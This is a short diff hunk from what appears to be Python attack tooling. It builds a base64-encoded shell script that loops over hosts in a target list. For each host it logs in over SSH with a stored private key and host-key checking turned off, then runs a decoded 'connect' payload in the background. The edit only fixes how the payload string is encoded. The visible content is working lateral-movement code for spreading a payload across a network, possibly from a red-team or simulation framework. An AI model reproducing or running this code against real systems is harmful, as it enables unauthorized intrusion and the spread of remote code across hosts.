@@ -206,7 +206,7 @@ exit 0
             payload = base64.b64encode(f'''
 for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do
     echo "connecting to: $h..."
-    ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key $h "nohup /bin/bash -c 'echo {connect_payload} | tee /tmp/payload_connect | base64 -d | /bin/bash -' >/dev/null 2>&1 &"
+    ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key $h "nohup /bin/bash -c 'echo {connect_payload.decode()} | tee /tmp/payload_connect | base64 -d | /bin/bash -' >/dev/null 2>&1 &"
     echo "result: $?"
     echo "connection complete."
 done'''.encode("utf-8"))
